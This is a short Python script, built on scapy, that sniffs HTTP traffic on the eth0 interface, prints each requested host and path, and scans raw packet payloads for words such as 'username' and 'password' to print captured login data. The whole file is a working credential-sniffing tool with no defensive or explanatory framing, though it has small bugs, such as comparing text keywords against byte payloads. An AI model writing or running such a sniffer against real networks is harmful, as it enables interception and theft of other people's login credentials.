#!/usr/bin/env python3
import scapy.all as scapy
from scapy.layers import http

def sniff(interface):
    scapy.sniff(iface=interface, store=False, prn=output)

def get_URL(packet):
    return packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path

def get_UserPass(packet):
    if packet.haslayer(scapy.Raw):
        load = packet[scapy.Raw].load
        list = ["username", "Username", "User", "user", "Password", "password", "Pass", "pass"]
        for i in list:
            if i in load:
                return load

def output(packet):
    if packet.haslayer(http.HTTPRequest):
        url = get_URL(packet)
        print("HTTP Response >> " + str(get_URL(packet)) + "\n")
        login_info = get_UserPass(packet)
        if login_info:
            print("\n\n[+]login_info >> " + str(login_info) + "\n\n")

sniff("eth0")
